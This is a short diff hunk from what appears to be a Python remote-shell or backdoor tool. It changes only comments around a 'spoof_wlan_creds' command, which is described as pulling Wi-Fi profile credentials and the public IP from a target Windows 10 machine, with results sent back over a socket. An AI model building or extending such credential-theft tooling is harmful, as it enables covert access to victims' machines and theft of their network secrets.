@@ -246,9 +246,7 @@ def shell():
 			sock.send(w.encode('utf-8'))  # Encoding to send data
 
 
-		# This portion will be updated soon...
-
-		# spoofing wlan profile creds and wan/public ip from trgt win10 machine
+		# spoofing wlan profile creds and wan/public ip from trgt win10 machine  ✓
 		elif cmd[:16] == "spoof_wlan_creds" and len(cmd) > 1:
 
 			# Printing trgt's wan.public ip
